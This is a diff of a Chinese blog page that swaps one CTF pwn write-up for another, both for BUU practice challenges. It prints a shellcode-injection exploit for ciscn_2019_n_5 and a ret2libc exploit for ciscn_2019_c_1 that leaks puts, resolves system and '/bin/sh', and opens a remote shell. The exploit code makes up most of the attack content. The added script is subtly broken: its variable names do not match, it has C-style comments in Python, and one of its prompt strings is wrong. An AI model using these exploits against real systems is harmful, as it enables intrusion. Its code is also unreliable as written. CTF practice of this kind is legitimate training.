@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>每日1+（认怂了） | nianchu</title>
+<title>基础泄漏libc  buu | nianchu</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
@@ -24,11 +24,12 @@
 
 
 
-    <meta name="description" content="buu ciscn_2019_n_5
-在buu上拿到附件 checksec一下
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canar..." />
+    <meta name="description" content="checksec得 64位系统+NX保护
+
+main函数选择
+int begin()
+{
+  puts(&quot;==============================================================..." />
     <meta name="keywords" content="" />
   </head>
   <body>
@@ -100,49 +101,72 @@
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">每日1+（认怂了）</h2>
-            <div class="post-date">2021-08-03</div>
+            <h2 class="post-title">基础泄漏libc  buu</h2>
+            <div class="post-date">2021-11-04</div>
             
             <div class="post-content" v-pre>
-              <h2 id="buu-ciscn_2019_n_5">buu ciscn_2019_n_5</h2>
-<p>在buu上拿到附件 checksec一下</p>
-<pre><code>    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x400000)
-    RWX:      Has RWX segments
-</code></pre>
-<p>发现这是64位系统 没开任何保护<br>
-打开ida64  找到main函数按F5获得伪代码</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+              <p>checksec得 64位系统+NX保护<br>
+<img src="https://cc-nianchu.github.io/post-images/1636007024609.png" alt="" loading="lazy"><br>
+main函数选择</p>
+<pre><code>int begin()
 {
-  char text[30]; // [rsp+0h] [rbp-20h] BYREF
-
-  setvbuf(stdout, 0LL, 2, 0LL);
-  puts(&quot;tell me your name&quot;);
-  read(0, name, 0x64uLL);
-  puts(&quot;wow~ nice name!&quot;);
-  puts(&quot;What do you want to say to me?&quot;);
-  gets(text);
-  return 0;
+  puts(&quot;====================================================================&quot;);
+  puts(&quot;1.Encrypt&quot;);
+  puts(&quot;2.Decrypt&quot;);
+  puts(&quot;3.Exit&quot;);
+  return puts(&quot;Input your choice!&quot;);
 }
 </code></pre>
-<p>发现第一次让我们输入名字 然后限制长度为0x64  并且name是在.bss段上<br>
-第二次是利用gets函数，没有限制长度，可以用gets函数进行溢出<br>
-我们得思路是:<br>
-第一个漏洞写入shellcode<br>
-然后第二个漏洞溢出去到name参数去然后执行shellcode拿到shell<br>
-exp:</p>
+<p>查看1函数<img src="https://cc-nianchu.github.io/post-images/1636007075011.png" alt="" loading="lazy"><br>
+发现这是一道加密题，无system函数也无binsh无libc，发现有gets()溢出点，发现可以利用的函数puts，很明显一道libc题<br>
+exp</p>
 <pre><code>from pwn import*
+from LibcSearcher import*
 
-q=remote('node4.buuoj.cn',25042)
+q=remote('node4.buuoj.cn',25762)
+elf=ELF('./ciscn_2019_c_1')
 
-q.sendlineafter('tell me your name',asm(shellcraft.sh()))
+main_add=0x400B28
+ret_add=0x4006b9
+pop_rdi=0x400c83
 
-payload='a'*0x28+p64(0x601080)
-q.sendlineafter('What do you want to say to me?',payload)
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
 
+q.recvuntil(&quot;choice!\n&quot;)
+q.sendline('1')
+
+payload ='\0'+'a'*(0x50-1+8)                //绕过字符串判断
+payload +=p64(pop_rdi)
+payload +=p64(puts_got)
+payload +=p64(puts_plt)
+payload +=p64(main_add)
+
+q.recvuntil('encrypted\n')
+q.sendline(payload)
+
+q.recvline()
+q.recvline()
+
+puts_add=u64(q.recvuntil('\n')[:-1].ljust(8,'\0'))
+print hex(puts_addr)
+
+libc=LibcSearcher('puts',puts_addr)
+offset=puts_addr-libc.dump('puts')
+binsh=offset+libc.dump('str_bin_sh')
+system=offset+libc.dump('system')
+
+q.recvuntil('choice\n')
+q.sendline('1')
+
+payload ='\0'+'a'*(0x50-1+8)                //绕过字符串判断
+payload +=p64(ret_add)                      //ubuntu18 栈对齐
+payload +=p64(pop_rdi)
+payload +=p64(binsh)
+payload +=p64(system)
+
+q.recvuntil('encrypted\n')
+q.sendline(payload)
 q.interactive()
 </code></pre>
 
@@ -151,9 +175,9 @@ q.interactive()
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://cc-nianchu.github.io/post/mei-ri-3/">
+                <a href="https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/">
                   <h3 class="post-title">
-                    每日3+
+                    泄漏libc+栈迁移
                   </h3>
                 </a>
               </div>
